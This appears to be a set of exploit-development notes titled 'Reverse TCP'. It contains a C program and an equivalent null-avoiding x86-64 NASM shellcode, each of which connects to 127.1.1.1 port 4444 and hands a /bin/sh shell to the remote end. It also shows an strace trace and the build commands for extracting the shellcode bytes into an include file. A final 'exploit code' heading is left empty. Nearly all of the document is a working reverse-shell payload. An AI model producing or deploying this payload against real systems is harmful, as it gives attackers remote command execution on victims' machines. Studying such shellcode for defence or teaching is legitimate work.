# Reverse TCP

## C

```c
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>
int main() {
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in addr;
  addr.sin_family = AF_INET;
  addr.sin_port = htons(4444);
  addr.sin_addr.s_addr = inet_addr("127.1.1.1");
  connect(sock, (struct sockaddr *)&addr, sizeof(addr));
  dup2(sock, STDIN_FILENO);
  dup2(sock, STDOUT_FILENO);
  dup2(sock, STDERR_FILENO);
  execve("/bin//sh", NULL, NULL);
}
```

```bash
strace -nfe socket,connect,dup2,execve ./c_reverse
[  59] execve("./c_reverse", ["./c_reverse"], 0x7fffffffe0f0 /* 31 vars */) = 0
[  41] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
[  42] connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.1.1.1")}, 16) = 0
[  33] dup2(3, 0)                       = 0
[  33] dup2(3, 1)                       = 1
[  33] dup2(3, 2)                       = 2
[  59] execve("/bin//sh", NULL, NULL)   = 0
[ 231] +++ exited with 0 +++
```

## nasm

```bash
nasm -o reverse.o -f elf64 reverse.nasm
ld -o reverse reverse.o
objcopy -O binary -j .text reverse.o reverse.bin
xxd -i -n code ./reverse.bin >reverse.include
```

```nasm
section .text
global _start
_start:
	xor rdi, rdi
	mov dil, 2   ; arg1: AF_INET=2
	xor rsi, rsi ;
	inc rsi      ; arg2: SOCK_STREAM=1
	xor rdx, rdx ; arg3; IPPROTO_IP=0
	xor rax, rax
	mov al, 41   ; socket
	syscall      ; int socket(2, 1, 0);
	mov rdi, rax ; arg1: sockfd

	; <stack> (network byte order)
	; 0x02 0x00 0x11 0x5c 0x7f 0x01 0x01 0x01
        ; 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
	; [2] AF_INET=2, [2] 0x115c=4444, [4] 0x7f010101=127.1.1.1
	; [8] PADDING
	xor rbx, rbx
	push rbx                    ; [8] PADDING
	mov rbx, 0x0101017f5c110002 ; [2] sin_family[2] sin_port [4] sin_addr
	push rbx
	push rsp
	pop rsi      ; arg2: &addr

	xor rdx, rdx
	mov dl, 16   ; arg3; 16

	xor rax, rax
	mov al, 42   ; int connect(sockfd, &addr, 16)
	syscall

	xor rsi, rsi ;
	mov sil, 2   ; arg2: for (newfd=2; rsi >= 0; --rsi)
loop:
	xor rax, rax
	mov al, 33   ; dup2(3, newfd)
	syscall
	dec rsi
	jns loop

	xor rax, rax
        push rax                    ; '\0'
        mov rbx, 0x68732f2f6e69622f ; "/bin//sh"
        push rbx
        push rsp
        pop rdi                     ; arg1: "/bin//sh\0"
        xor rsi, rsi                ; arg2: NULL
        xor rdx, rdx                ; arg3: NULL
        mov al, 59                  ; execve("/bin//sh", NULL, NULL);
        syscall
```

## exploit code
